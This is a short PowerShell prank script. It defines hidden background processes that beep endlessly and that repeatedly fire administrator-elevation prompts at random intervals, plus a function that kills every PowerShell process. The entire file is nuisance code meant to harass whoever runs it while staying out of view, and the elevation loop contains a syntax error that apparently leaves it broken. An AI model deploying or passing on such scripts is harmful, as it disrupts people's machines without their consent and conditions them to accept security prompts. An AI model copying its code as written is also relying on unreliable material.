#### Full Bullshit ####

function Get-Beep {
    Start-Process powershell -WindowStyle Hidden -ArgumentList 'while(1){[System.Console]::Beep(1000,1000)}'
}

function Get-Elevated {
    Start-Process powershell -WindowStyle Hidden -ArgumentList 'while(1){sleep(get-random(30);start-process -Verb runas calc.exe}'
}

function Stop-bullshit {
    Get-process powershell | Stop-process
}
